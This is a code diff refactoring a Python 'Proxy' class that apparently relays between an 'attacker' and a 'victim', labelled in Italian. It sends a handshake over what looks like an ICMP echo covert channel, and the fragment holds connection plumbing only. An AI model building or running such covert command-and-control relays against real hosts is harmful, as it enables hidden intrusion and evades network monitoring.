@@ -302,7 +302,35 @@ class Proxy:
                 self.ip_host.compressed
                 )
             self.socket_attacker.sendall(data.encode()) 
-            
+        def connessione_vittima(): 
+            thread_victim_connection=PROXY_THREAD.VICTIM_CONNECTION()
+            thread_victim_connection.start(self.ip_vittima, self.ip_host) 
+            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
+                raise TypeError("attack_function non valida")  
+            #int_version=self.attack_function.name.replace("ipv","").split("_")[0]  
+            #int_code=self.attack_function.value  
+            #XORversion= ord("i") ^ int(int_version) 
+            #XORcode= ord("p") ^ int(int_code)  
+            #icmp_id=(XORversion<<8)+XORcode  
+            confirm_text=(
+                MSG.CONFIRM_PROXY.value+
+                self.ip_vittima.compressed+
+                self.attack_function.name 
+            ) 
+            SendSingleton(
+                ATTACK_TYPE.ipv4_echo_payload, 
+                SENDER_TRUE_SENDER, 
+                False 
+            ).send_data(confirm_text.encode(), self.ip_vittima) 
+            print("Confirm sent to victim...") 
+            print("Waiting thread to end...") 
+            thread_victim_connection.wait()  
+            with thread_victim_connection.lock: 
+                response=thread_victim_connection.response
+            print("Thread has been executed...") 
+            if response: 
+                print("Received confirm from victim...")
+            else: raise RuntimeError("Conferma non arrivata dalla vittima") 
         def update_attaccante(result:bool): 
             #AGGIORNO ATTACCANTE SU CONNESISONE CON VITTIMA
             if attacker_mode: 
@@ -344,7 +372,7 @@ class Proxy:
             connessione_attaccante() 
             print("Connessione con attaccante stabilita") 
             print("Controllo connesisone con vittima")
-            self.connessione_vittima() 
+            connessione_vittima() 
             print("Aggiorno attaccante...")
             update_attaccante(self.thread_data.response)  
             if not self.thread_data.response: 
@@ -356,44 +384,6 @@ class Proxy:
         finally: 
             pass 
             #FIREWALL.enable() 
-    
-    def connessione_vittima(self): 
-        thread_victim_connection=PROXY_THREAD.VICTIM_CONNECTION()
-        thread_victim_connection.start(self.ip_vittima, self.ip_host) 
-        print("Waiting thread to end...") 
-        thread_victim_connection.wait() 
-        
-        self.thread_data=THREAD_VAR( 
-            lambda: wait_conn_from_victim(self) 
-        ) 
-        self.thread_data.start() 
-        if not is_enum_member(self.attack_function,ATTACK_TYPE): 
-            raise TypeError("attack_function non valida")  
-        #int_version=self.attack_function.name.replace("ipv","").split("_")[0]  
-        #int_code=self.attack_function.value  
-        #XORversion= ord("i") ^ int(int_version) 
-        #XORcode= ord("p") ^ int(int_code)  
-        #icmp_id=(XORversion<<8)+XORcode  
-        confirm_text=(
-            MSG.CONFIRM_PROXY.value+
-            self.ip_vittima.compressed+
-            self.attack_function.name
-        )  
-        SendSingleton(
-            ATTACK_TYPE.ipv4_echo_payload, 
-            SENDER_TRUE_SENDER, 
-            False 
-        ).send_data(confirm_text.encode(), self.ip_vittima) 
-        print("Confirm sent to victim...")
-        self.thread_data.wait()  
-        print("Thread has been executed...")
-        self.thread_data.acquire_lock()  
-        response=self.thread_data.response
-        self.thread_data.release_lock() 
-        if response: 
-            print("Received confirm from victim...")
-        else: raise RuntimeError("CONFERMA DALLA VITITMA NON ARRIVATA") 
-        print("END connessione_vittima")
         
     def comando_from_attaccante(self): 
         def IF_attacker_mode(): 
